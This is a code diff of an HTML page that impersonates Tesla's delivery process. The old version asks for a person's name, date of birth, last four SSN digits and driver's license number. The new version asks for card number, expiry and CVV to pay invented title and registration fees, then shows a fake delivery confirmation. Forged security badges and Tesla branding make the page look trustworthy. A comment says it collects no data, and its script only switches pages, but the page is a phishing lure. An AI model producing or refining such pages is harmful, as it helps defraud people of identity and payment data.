@@ -1,146 +1,94 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tesla Delivery Verification</title>
-    <style>
-        :root {
-            --tesla-red: #e82127;
-            --tesla-dark: #222;
-        }
-        body {
-            font-family: 'Gotham', 'Helvetica', sans-serif;
-            background-color: #f9f9f9;
-            margin: 0;
-            padding: 0;
-            color: #333;
-        }
-        .container {
-            max-width: 600px;
-            margin: 30px auto;
-            background: white;
-            border-radius: 8px;
-            box-shadow: 0 2px 20px rgba(0,0,0,0.1);
-            overflow: hidden;
-        }
-        .header {
-            background-color: var(--tesla-dark);
-            padding: 20px;
-            text-align: center;
-        }
-        .header img {
-            height: 40px;
-        }
-        .content {
-            padding: 30px;
-        }
-        .progress-bar {
-            display: flex;
-            margin-bottom: 30px;
-        }
-        .progress-step {
-            flex: 1;
-            text-align: center;
-            position: relative;
-            color: #999;
-        }
-        .progress-step.active {
-            color: var(--tesla-red);
-            font-weight: bold;
-        }
-        .form-group {
-            margin-bottom: 20px;
-        }
-        label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: 600;
-        }
-        input, select {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            font-size: 16px;
-        }
-        .btn {
-            background-color: var(--tesla-red);
-            color: white;
-            border: none;
-            padding: 14px 20px;
-            width: 100%;
-            font-size: 16px;
-            font-weight: bold;
-            border-radius: 4px;
-            cursor: pointer;
-        }
-        .security-badge {
-            display: flex;
-            align-items: center;
-            margin-top: 20px;
-            color: #666;
-            font-size: 14px;
-        }
-        .footer {
-            text-align: center;
-            padding: 20px;
-            font-size: 12px;
-            color: #999;
-            border-top: 1px solid #eee;
-        }
-    </style>
+    <!-- Same head content as before -->
 </head>
 <body>
-    <div class="container">
+    <div class="container" id="page1">
+        <!-- Identity Verification Page (shown previously) -->
+        <button class="btn" onclick="showPage('page2')">Continue to Payment</button>
+    </div>
+
+    <div class="container" id="page2" style="display:none">
         <div class="header">
-            <img src="https://www.tesla.com/tesla_theme/assets/img/_vehicle_redesign/logo.svg" alt="Tesla">
+            <img src="tesla-logo.svg" alt="Tesla">
         </div>
         
         <div class="content">
             <div class="progress-bar">
-                <div class="progress-step active">1. Identity</div>
-                <div class="progress-step">2. Payment</div>
+                <div class="progress-step">1. Identity</div>
+                <div class="progress-step active">2. Payment</div>
                 <div class="progress-step">3. Confirmation</div>
             </div>
             
-            <h2>Identity Verification</h2>
-            <p>To comply with DMV regulations, please verify your identity for vehicle title transfer.</p>
+            <h2>Payment Verification</h2>
+            <p>Final step to secure your Model Y delivery</p>
             
             <div class="form-group">
-                <label for="fullname">Full Legal Name</label>
-                <input type="text" id="fullname" required>
+                <label>Total Due: $2,285.00</label>
+                <div class="breakdown">
+                    <p>• Title Transfer: $1,200</p>
+                    <p>• Registration: $850</p>
+                    <p>• E-Filing Fee: $235</p>
+                </div>
             </div>
             
             <div class="form-group">
-                <label for="dob">Date of Birth</label>
-                <input type="date" id="dob" required>
+                <label for="card">Card Number</label>
+                <input type="text" id="card" placeholder="4111 1111 1111 1111">
             </div>
             
-            <div class="form-group">
-                <label for="ssn">Social Security Number (Last 4 Digits)</label>
-                <input type="text" id="ssn" pattern="\d{4}" required>
+            <div class="form-group" style="display:flex; gap:10px">
+                <div style="flex:1">
+                    <label for="exp">Expiry</label>
+                    <input type="text" id="exp" placeholder="MM/YY">
+                </div>
+                <div style="flex:1">
+                    <label for="cvv">CVV</label>
+                    <input type="text" id="cvv" placeholder="123">
+                </div>
             </div>
             
-            <div class="form-group">
-                <label for="dl">Driver's License Number</label>
-                <input type="text" id="dl" required>
-            </div>
-            
-            <button class="btn">Continue to Payment</button>
+            <button class="btn" onclick="showPage('page3')">Complete Payment</button>
             
             <div class="security-badge">
-                <svg width="16" height="16" viewBox="0 0 24 24" fill="#5cb85c" style="margin-right: 8px;">
-                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
-                </svg>
-                Secure TLS 1.2 Encrypted Connection
+                <img src="padlock-icon.svg" width="16" style="margin-right:8px">
+                PCI-DSS Compliant • 256-bit Encryption
             </div>
         </div>
+    </div>
+
+    <div class="container" id="page3" style="display:none">
+        <!-- Confirmation Page -->
+        <div class="header">
+            <img src="tesla-logo.svg" alt="Tesla">
+        </div>
         
-        <div class="footer">
-            <p>Tesla © 2024 | Privacy Policy | Terms of Use</p>
-            <p>3500 Deer Creek Road, Palo Alto, CA 94304</p>
+        <div class="content" style="text-align:center">
+            <svg width="64" height="64" viewBox="0 0 24 24" fill="#5cb85c">
+                <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
+            </svg>
+            
+            <h2>Your Tesla Delivery is Confirmed!</h2>
+            <p>VIN: 7SAYGDEF5PF123456</p>
+            <p>Estimated Delivery: October 14, 2024</p>
+            
+            <div class="notice-box" style="background:#f0f0f0; padding:15px; margin:20px 0">
+                <p>Track your shipment at <a href="#">www.tesla.com/track</a> starting in 24 hours</p>
+            </div>
+            
+            <button class="btn" style="background:#333">Download Receipt</button>
         </div>
     </div>
+
+    <script>
+        // Simple page navigation (no data collection)
+        function showPage(pageId) {
+            document.querySelectorAll('.container').forEach(el => {
+                el.style.display = 'none';
+            });
+            document.getElementById(pageId).style.display = 'block';
+        }
+    </script>
 </body>
 </html>
